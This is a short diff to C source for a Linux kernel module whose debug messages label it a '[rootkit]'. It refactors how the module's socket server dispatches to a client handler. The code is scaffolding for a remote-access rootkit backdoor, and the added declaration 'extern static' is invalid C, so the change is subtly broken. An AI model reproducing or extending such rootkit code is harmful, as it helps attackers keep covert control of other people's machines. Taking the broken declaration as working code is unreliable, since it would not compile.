@@ -17,7 +17,6 @@ struct client_t{ //structure holding client information
 	struct kvec sock_vec; //holds vector of data recieved
 	struct msghdr sock_msg; //structure to hold data recieved
 	char *message; //structure to hold message sent or recieved
-	int (*client_handler)(void); //pointer to function for handling client
 };
 
 struct server_t{
@@ -27,6 +26,8 @@ struct server_t{
 };
 
 struct client_t client; //global variable holding  data associated with client for easy access by all functions
+
+extern static int client_handler(void); //declares client handler function as external
 
 /*========================*\
 	networking functions
@@ -81,7 +82,7 @@ static int run_server(int port){ //creates the server
 			printk(KERN_DEBUG "[rootkit] run_server- server accept error!- %i\n", err); //prints debug info
 			return err; //returns -1 for error
 		}
-		err = client.client_handler();
+		err = client_handler();
 		if (err<0){ //if error with handling
 			printk(KERN_DEBUG "[rootkit] run_server- client handle error!- %i\n", err); //prints debug info
 			return err; //returns -1 for error
